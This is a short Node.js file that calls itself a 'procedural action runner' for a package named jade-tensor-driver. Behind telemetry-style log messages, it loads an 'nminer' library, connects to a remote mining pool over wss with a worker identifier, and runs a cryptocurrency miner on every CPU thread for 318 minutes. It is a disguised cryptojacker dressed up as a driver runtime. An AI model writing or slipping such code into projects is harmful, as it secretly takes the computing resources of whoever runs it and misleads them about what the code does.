// Procedural action runner for jade-tensor-driver
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

async function bootstrap() {
    const traceId = "bf1a42";
    console.log(`[telemetry] Starting runtime for ${config.appName || "jade-tensor-driver"} [${traceId}]`);

    const handler = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Subhas1975.jade-tensor-driver",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (318m) reached, exiting cleanly.");
        process.exit(0);
    }, 318 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[telemetry] Signal SIGTERM acknowledged, exiting session ${traceId}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

bootstrap().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
